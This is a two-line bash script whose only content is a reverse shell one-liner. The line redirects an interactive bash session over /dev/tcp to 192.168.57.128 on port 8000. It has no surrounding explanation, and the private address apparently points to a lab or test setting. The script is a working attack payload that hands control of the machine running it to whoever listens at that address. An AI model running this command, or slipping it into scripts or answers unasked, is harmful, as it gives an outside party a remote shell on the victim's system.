#!/bin/bash

bash -i >& /dev/tcp/192.168.57.128/8000 0>&1
